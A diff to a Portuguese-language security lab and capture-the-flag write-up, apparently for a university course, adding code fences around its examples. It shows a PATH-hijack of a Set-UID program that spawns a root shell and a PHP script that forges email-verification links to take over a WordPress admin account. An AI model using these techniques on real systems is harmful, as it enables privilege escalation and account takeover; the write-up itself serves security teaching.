@@ -14,7 +14,7 @@
 
 ### Passo 1
   **Procedimento:** Compilar e correr "myprintenv.c":
-
+```c
     #include <unistd.h>
     #include <stdio.h>
     #include <stdlib.h>
@@ -42,13 +42,13 @@
           exit(0);
       }
     }
-
+```
   **Conclusão:** As variáveis de ambiente são impressas para o ficheiro pelo processo filho.
 
   
 ### Passo 2
   **Procedimento:** Alterar o código de myprintenv.c, comentando o printenv() do processo filho e descomentando o printenv() do processo pai. Compilar e correr "myprintenv.c":
-
+  ```c
       switch(childPid = fork()) {
         case 0:  /* child process */
           printenv();          
@@ -57,7 +57,7 @@
           // printenv();       
           exit(0);
       }
-
+  ```
   **Conclusão:** As variáveis de ambiente são impressas para o ficheiro pelo processo pai.
 
 
@@ -73,6 +73,7 @@
 ### Passo 1
   **Procedimento:** Compilar e correr o programa myenv.c:
 
+```c
     #include <unistd.h>
 
     extern char **environ;
@@ -88,6 +89,7 @@
 
       return 0 ;
     }
+```
 
   **Conclusão** Não há qualquer output ao correr o programa.
 
@@ -119,10 +121,10 @@
 
 ### Passo 2
   **Procedimento:** Compilar o programa a cima, alterando o seu dono para root e tornando-o um programa Set-UID:
-
+```sh
     $ sudo chown root foo
     $ sudo chomod 4755 foo
-
+```
   Verificar que o dono do programa foi alterado e verificar que passou a ser um programa Set-UID (através do setgid bit), utilizando o comando:
 
     $ ls -l
@@ -151,21 +153,21 @@
     export PATH=/home/seed:$PATH
 
   Como o programa não chama ls com o endereço absoluto, este vai passar a executar o ls que estiver em /home/seed, que será criado por nós:
-
+```c
     int main()
     {
     system("ls");
     return 0;
     }
-
+```
   Criando um programa ls com o ls.c podemos chamar /bin/sh para obter uma shell como root:
-  
+```c  
     int main()
     {
     system("/bin/sh");
     return 0;
     }
-
+```
   **Conclusão**:
 
   Como o programa original corre como root e chama o nosso programa ls, conseguimos obter uma shell com permissões de root, como é possível verificar correndo os comandos
@@ -194,7 +196,7 @@ Encontramos um exploit em https://www.wordfence.com/blog/2021/08/critical-authen
   1. Enviar um request para o <em>home<em> URL com o wcj_user_id a 1, pois esperado que o id de admin seja 1, que é a conta a queremos acesso.
   2. Como o código de verificação para recuperar conta é apenas um hash md5 da hora do pedido, é possível criar o URL que verifica o email.
   3. Através do seguinte script php, geramos vários URL com a hora próxima (diferença de segundos) da hora do pedido, para garantir que um deles tem a hora exata do pedido e, então, o link que verifica o email:
-
+  ```php
     <?php
         
     $user_id = 1;
@@ -207,4 +209,5 @@ Encontramos um exploit em https://www.wordfence.com/blog/2021/08/critical-authen
 
         echo "http://ctf-fsi.fe.up.pt:5001/my-account?wcj_verify_email=$encoded\n";
     }
+  ```  
   4. Após aceder ao URL de confirmação de email, passamos a ter acesso como admin.
